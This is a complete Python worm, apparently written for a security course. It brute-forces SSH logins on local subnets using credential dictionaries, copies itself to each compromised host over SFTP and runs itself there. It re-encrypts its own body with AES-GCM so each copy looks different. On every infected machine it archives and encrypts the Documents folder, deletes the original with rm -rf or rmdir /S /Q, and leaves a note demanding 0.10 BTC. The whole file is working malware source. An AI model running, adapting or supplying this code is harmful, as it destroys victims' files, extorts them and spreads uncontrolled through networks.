#!/usr/bin/env python3
"""
This worm does the following:
  - If the file is mutated (contains the AES‑GCM decryption wrapper),
    it decrypts and executes its worm body.
  - Otherwise, it scans for new target hosts (via SSH),
    infects them, and then self‑mutates (AES‑GCM encryption) so that a new unique copy
    is used for the next propagation cycle.

This version is designed to work on both Linux and Windows.
"""

import sys, os, base64, uuid, socket, subprocess, threading, traceback, logging
from datetime import datetime
from random import shuffle
import concurrent.futures
import re

import netifaces
from netaddr import IPAddress, IPNetwork, AddrFormatError
import paramiko
from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException

# --- Decryption Stub ---
def polymorphic_decrypt():
    """If the file contains an AES‑GCM decryption wrapper, decrypt and exec its worm body."""
    current_file = sys.argv[0]
    with open(current_file, "r") as f:
        content = f.read()
    try:
        _, poly_body = content.split("# === ENCRYPTED BODY START ===\n", 1)
    except ValueError:
        return  # No marker => not mutated
    exec(poly_body, globals())

# Check if mutated; if so, execute the decryption wrapper.
with open(sys.argv[0], "r") as f:
    head = f.read(4096)
if "# === ENCRYPTED BODY START ===" in head:
    polymorphic_decrypt()

# === ENCRYPTED BODY START ===
# (This section is replaced by the AES‑GCM decryption wrapper after mutation)
# === END WRAPPER ===

#################################
# Logging Configuration
#################################
class ColorizedFormatter(logging.Formatter):
    grey = "\x1b[38;21m"
    yellow = "\x1b[33;21m"
    red = "\x1b[31;21m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    base_format = "%(asctime)s - %(message)s"
    FORMATS = {
        logging.DEBUG: grey + base_format + reset,
        logging.INFO: grey + base_format + reset,
        logging.WARNING: yellow + base_format + reset,
        logging.ERROR: red + base_format + reset,
        logging.CRITICAL: bold_red + base_format + reset
    }
    def format(self, record):
        fmt = self.FORMATS.get(record.levelno, self.base_format)
        return logging.Formatter(fmt).format(record)

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(ColorizedFormatter())
logger.addHandler(console_handler)
file_handler = logging.FileHandler(filename=os.path.join(os.path.expanduser("~"), "dmsg.log"))
file_handler.setLevel(logging.DEBUG)
file_formatter = logging.Formatter('%(asctime)s - %(message)s')
file_handler.setFormatter(file_formatter)
logger.addHandler(file_handler)

#################################
# Worm Configuration Constants
#################################
HOME_DIR = os.path.expanduser("~")
REMOTE_DIR = os.path.join(HOME_DIR, "Temp", "default")
INFECTED_LOG = os.path.join(HOME_DIR, "infected.log")
USERNAME_DICT = "username.txt"
PASSWORD_DICT = "password.txt"
ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
BLOCKED_SUBNETS = ["169.254.0.0/16"]
MIN_SUBNET_MASK = 24

#################################
# Polymorphic Engine (AES‑GCM Functions)
#################################
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def aes_encrypt_transform(text):
    """Encrypt text using AES‑GCM; return key, nonce, tag, ciphertext."""
    key = os.urandom(32)
    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(text.encode("utf-8")) + encryptor.finalize()
    tag = encryptor.tag
    return key, nonce, tag, ciphertext

def gen_aes_wrapper(worm_body):
    """Generate an AES‑GCM decryption wrapper for the worm body."""
    key, nonce, tag, ciphertext = aes_encrypt_transform(worm_body)
    wrapper = (
        "#!/usr/bin/env python3\n"
        "import base64, os\n"
        "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n"
        "from cryptography.hazmat.backends import default_backend\n"
        "\n"
        f"key = base64.urlsafe_b64decode('{base64.urlsafe_b64encode(key).decode()}')\n"
        f"nonce = base64.urlsafe_b64decode('{base64.urlsafe_b64encode(nonce).decode()}')\n"
        f"tag = base64.urlsafe_b64decode('{base64.urlsafe_b64encode(tag).decode()}')\n"
        f"ciphertext = base64.urlsafe_b64decode('{base64.urlsafe_b64encode(ciphertext).decode()}')\n"
        "\n"
        "cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())\n"
        "decryptor = cipher.decryptor()\n"
        "plaintext = decryptor.update(ciphertext) + decryptor.finalize()\n"
        "exec(plaintext, globals())\n"
    )
    return wrapper

def polymorph_file(file_path):
    """Self‑mutate: replace the worm body with a new AES‑GCM wrapper and rename the file."""
    with open(file_path, "r") as f:
        content = f.read()
    try:
        header, body = content.split("# === ENCRYPTED BODY START ===\n", 1)
    except ValueError:
        logger.error("File does not contain expected encryption marker.")
        sys.exit(1)
    # Append a random salt so that the encrypted body changes.
    salt = f"\n# MUTATION SALT: {uuid.uuid4().hex}\n"
    body += salt
    wrapper = gen_aes_wrapper(body)
    new_content = header + "# === ENCRYPTED BODY START ===\n" + wrapper
    with open(file_path, "w") as f:
        f.write(new_content)
    new_name = f"netvermin_{uuid.uuid4().hex[:8]}.py"
    os.rename(file_path, new_name)
    logger.error(f"Worm file mutated to {new_name}")
    return new_name

#################################
# Cross‑Platform Route Scanning
#################################
def routes():
    """Retrieve IPv4 routes from the system."""
    if sys.platform.startswith("win"):
        # Use 'route print -4' on Windows
        try:
            output = subprocess.check_output(["route", "print", "-4"], shell=True).decode()
        except Exception as e:
            logger.error(f"Error running 'route print': {e}")
            return []
        discovered = []
        # A simple regex that matches lines with network destination and netmask
        for line in output.splitlines():
            m = re.search(r"^\s*(\d+\.\d+\.\d+\.\d+)\s+(\d+\.\d+\.\d+\.\d+)\s+", line)
            if m:
                try:
                    network = IPNetwork(f"{m.group(1)}/{m.group(2)}")
                    discovered.append(network)
                except AddrFormatError:
                    continue
        return discovered
    else:
        # Linux: use 'ip route'
        try:
            output = subprocess.check_output(["ip", "route"]).decode()
        except Exception as e:
            logger.error(f"Error running 'ip route': {e}")
            return []
        discovered = []
        for line in output.splitlines():
            parts = line.split()
            if parts and parts[0] != "default":
                try:
                    network = IPNetwork(parts[0])
                    discovered.append(network)
                except AddrFormatError:
                    continue
        return discovered

def partition_subnet(subnet_list):
    """Split subnets with a mask shorter than MIN_SUBNET_MASK into smaller subnets."""
    new_subnet_list = []
    for subnet in subnet_list:
        if subnet.prefixlen < MIN_SUBNET_MASK:
            generated_subnets = list(subnet.subnet(MIN_SUBNET_MASK))
            shuffle(generated_subnets)
            new_subnet_list.extend(generated_subnets)
        else:
            new_subnet_list.append(subnet)
    return new_subnet_list

def local_addresses():
    """Retrieve local IPv4 addresses and associated CIDR subnets."""
    interfaces = netifaces.interfaces()
    ip_list = []
    subnet_list = []
    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
        if addrs:
            for addr in addrs:
                ip = addr.get('addr')
                netmask = addr.get('netmask')
                if ip and netmask:
                    logger.info(f"Interface found: {addr}")
                    try:
                        ip_obj = IPAddress(ip)
                        subnet = IPNetwork(f"{ip}/{netmask}").cidr
                        ip_list.append(ip_obj)
                        subnet_list.append(subnet)
                    except AddrFormatError:
                        continue
    return ip_list, subnet_list

#################################
# Cross‑Platform Ransomware Function
#################################
def deploy_ransomware():
    """Encrypt and delete documents; uses OS‑specific commands."""
    note_path = os.path.join(HOME_DIR, "openme.txt")
    if os.path.exists(note_path):
        logger.info("Ransom note exists. Skipping ransomware action.")
        return
    if sys.platform.startswith("win"):
        docs_dir = os.path.join(HOME_DIR, "Documents")
        zip_path = os.path.join(HOME_DIR, "Documents.zip")
        try:
            subprocess.check_call(["powershell", "-Command",
                                   f"Compress-Archive -Path '{docs_dir}' -DestinationPath '{zip_path}'"])
            subprocess.check_call(["rmdir", "/S", "/Q", docs_dir], shell=True)
            with open(note_path, "w") as f:
                f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
            logger.error("Ransomware operation completed on this host (Windows).")
        except Exception as e:
            logger.error("Error during ransomware operation (Windows): " + str(e))
    else:
        docs_dir = os.path.join(HOME_DIR, "Documents")
        tar_path = os.path.join(HOME_DIR, "Documents.tar")
        enc_path = os.path.join(HOME_DIR, "Documents.tar.enc")
        try:
            subprocess.check_call(["tar", "-cf", tar_path, docs_dir])
            subprocess.check_call(["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
                                     "-in", tar_path, "-out", enc_path, "-k", "cmpt783"])
            subprocess.check_call(["rm", "-rf", docs_dir])
            os.remove(tar_path)
            with open(note_path, "w") as f:
                f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
            logger.error("Ransomware operation completed on this host (Linux).")
        except Exception as e:
            logger.error("Error during ransomware operation (Linux): " + str(e))

def is_host_up(ip, port=22, timeout=0.5):
    """Attempt to open a TCP connection; return True if successful."""
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.close()
        return True
    except socket.error:
        return False

def scan_hosts(candidate_hosts, port=22, timeout=0.5, max_workers=50):
    """Concurrently scan a list of candidate hosts using a thread pool."""
    discovered = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(is_host_up, host, port, timeout): host for host in candidate_hosts}
        for future in concurrent.futures.as_completed(futures):
            host = futures[future]
            try:
                if future.result():
                    discovered.append(host)
            except Exception:
                continue
    return discovered

def scan_network(subnet, local_address_list):
    """
    Scan the given subnet for active hosts that are not local and not already infected.
    Returns a list of discovered host IP addresses (as strings).
    """
    attacked_ips = set(load_entries(INFECTED_LOG))
    hosts = [str(ip) for ip in subnet.iter_hosts()]
    local_str = set(str(ip) for ip in local_address_list)
    candidate_hosts = [host for host in hosts if host not in attacked_ips and host not in local_str]
    discovered_hosts = scan_hosts(candidate_hosts, port=22, timeout=0.5)
    return discovered_hosts

def filter_allowed(address_list):
    """Return only addresses within allowed subnets."""
    return [address for address in address_list if allowed(address)]

def allowed(address):
    """Return True if the address is in an allowed subnet and not in a blocked subnet."""
    for blocked in BLOCKED_SUBNETS:
        if address in IPNetwork(blocked):
            return False
    for allowed_subnet in ALLOWED_SUBNETS:
        if address in IPNetwork(allowed_subnet):
            return True
    return False

def update_infected_log(ip_list):
    """Append new IP addresses to the INFECTED_LOG."""
    current_ips = set()
    if os.path.exists(INFECTED_LOG):
        with open(INFECTED_LOG, "r") as f:
            for line in f:
                line = line.strip()
                try:
                    current_ips.add(str(IPAddress(line)))
                except Exception:
                    continue
    new_ips = [str(ip) for ip in ip_list if str(ip) not in current_ips]
    if new_ips:
        with open(INFECTED_LOG, "a") as f:
            timestamp = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
            f.write("+++Infected: " + timestamp + "+++\n")
            for ip in new_ips:
                f.write(ip + "\n")
            f.write("\n")

def connect_via_ssh(ip):
    """Attempt SSH login to target IP using credential lists."""
    ssh = paramiko.SSHClient()
    user_list = load_entries(USERNAME_DICT)
    pass_list = load_entries(PASSWORD_DICT)
    shuffle(user_list)
    shuffle(pass_list)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in user_list:
        for passwd in pass_list:
            logger.info(f"Attempting SSH connection to {ip} with {user}:{passwd}")
            try:
                ssh.connect(ip, username=user, password=passwd,
                            timeout=0.5, auth_timeout=0.5, banner_timeout=0.5,
                            allow_agent=False, look_for_keys=False)
                logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
                spread(ssh)
                sys.exit(0)  # After infecting, exit current process
            except (AuthenticationException, BadHostKeyException):
                logger.info("SSH authentication failed.")
            except (SSHException, EOFError) as e:
                logger.debug(f"SSH connection error on {ip}: {str(e)}")
            except Exception as e:
                logger.info(f"SSH connection error on {ip}: {str(e)}")
                return

def spread(ssh):
    """
    If the target is not already infected, mutate the worm,
    transfer it via SSH (using SFTP), and execute it remotely.
    """
    if check_remote_infection_marker(ssh):
        logger.error("Remote host already infected. Skipping infection...")
        return
    current_file = sys.argv[0]
    mutated_file = polymorph_file(current_file)
    logger.error(f"Transferring mutated worm {mutated_file} via SSH...")
    sftp = ssh.open_sftp()
    try:
        sftp.mkdir(REMOTE_DIR)
    except IOError:
        pass
    base_dir = os.getcwd()
    for filename in os.listdir(base_dir):
        full_path = os.path.join(base_dir, filename)
        remote_path = os.path.join(REMOTE_DIR, filename)
        if os.path.isfile(full_path):
            sftp.put(full_path, remote_path)
        else:
            try:
                sftp.mkdir(remote_path)
            except IOError:
                pass
    sftp.close()
    logger.error("Remote worm deployed. Executing worm via SSH...")
    t = threading.Thread(target=exec_remote_command, args=(ssh, f"(cd {REMOTE_DIR} && python3 {mutated_file})"))
    t.start()
    for handler in logger.handlers:
        handler.flush()
    sys.exit(0)

def check_remote_infection_marker(ssh):
    """Return True if the REMOTE_DIR exists on the remote machine."""
    sftp = ssh.open_sftp()
    try:
        sftp.chdir(REMOTE_DIR)
    except IOError:
        return False
    sftp.close()
    return True

def load_entries(filename):
    """Load lines from a file and return a list of stripped strings."""
    with open(filename) as f:
        return [line.strip() for line in f.readlines()]

def exec_remote_command(ssh, command):
    """Execute a command on a remote machine via SSH."""
    _, stdout, stderr = ssh.exec_command(command)
    logger.info("".join(stdout.readlines()))
    logger.info("".join(stderr.readlines()))

#################################
# Worm Main Propagation Function
#################################
def initiate_worm():
    """Main propagation cycle: scan, infect, and self-mutate if no new targets found."""
    # Deploy ransomware if not already done.
    if not os.path.isfile(os.path.join(HOME_DIR, "openme.txt")):
        deploy_ransomware()
    logger.info("Scanning local interfaces")
    local_ips, possible_subnets = local_addresses()
    logger.info("Scanning routes...")
    discovered_routes = routes()
    logger.info(f"Routes discovered: {discovered_routes}")
    for route in discovered_routes:
        if route not in possible_subnets:
            possible_subnets.append(route)
    logger.info(f"Found {len(possible_subnets)} subnets.")
    shuffle(possible_subnets)
    permitted_subnets = filter_allowed(possible_subnets)
    logger.info(f"Permitted subnets: {permitted_subnets}")
    logger.info("Splitting subnets...")
    partitioned_subnets = partition_subnet(permitted_subnets)
    final_subnets = filter_allowed(partitioned_subnets)
    logger.info(f"Generated {len(final_subnets)} subnets: {final_subnets}")
    logger.info("Updating infected log...")
    update_infected_log(local_ips)
    logger.info("Scanning subnets for new targets...")
    
    infection_done = False
    for subnet in final_subnets:
        hosts = scan_network(subnet, local_ips)
        shuffle(hosts)
        logger.info(f"Discovered hosts: {hosts}")
        logger.info("Attempting SSH connection...")
        for host in hosts:
            # Check allowed (using IPAddress from netaddr)
            if allowed(IPAddress(host)):
                connect_via_ssh(host)
                infection_done = True
                break
        if infection_done:
            break

    if not infection_done:
        logger.info("No new targets found. Terminating propagation.")
        sys.exit(0)


if __name__ == "__main__":
    try:
        initiate_worm()
    except Exception as e:
        traceback.print_exc()
